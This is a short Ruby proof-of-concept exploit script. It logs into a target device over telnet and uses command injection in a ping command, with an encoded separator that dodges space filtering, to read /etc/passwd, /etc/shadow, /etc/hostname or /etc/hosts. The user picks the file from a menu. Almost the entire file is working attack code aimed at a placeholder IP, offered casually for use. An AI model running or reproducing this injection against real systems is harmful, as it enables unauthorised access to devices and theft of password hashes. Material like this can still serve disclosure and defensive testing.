require 'net-telnet'

#Really ugly POC so dont @ me bro.

class Connection
    puts "Enter IP:\n"
    puts "Select an option:"
    puts "\n1.Get /etc/passwd\n2.Get /etc/shadow\n3.Get /etc/hostname\n4.Get /etc/hosts"
    choice = gets.chomp
    if choice == "1"
        com = "ping 127.0.0.1;HZ=$'\\n';cat$hz/etc/passwd"
    end
    if choice == "2"
        com = "ping 127.0.0.1;HZ=$'\\n';cat$hz/etc/shadow"
    end
    if choice == "3"
        com = "ping 127.0.0.1;HZ=$'\\n';cat$hz/etc/hostname"
    end
    if choice == "4"
        com = "ping 127.0.0.1;HZ=$'\\n';cat$hz/etc/hosts"
    end
    command = Net::Telnet::new("Host" => "$ENTER_YOUR_IP_HERE",
                                "Port" => 23, #Default
                                "Timeout" => 10,
                                "Telnetmode" => false,
                                "Binmode" => false,
                                "Prompt" => /[$%#>] \z/n)
    
    
    command.cmd((com)) { |c| print c}
    #Cant figure out the Regex here but it keeps hanging...Kinda limiting  for the menu capability...
    #Basically you have to Ctrl+C to leave.
    command.close()
end
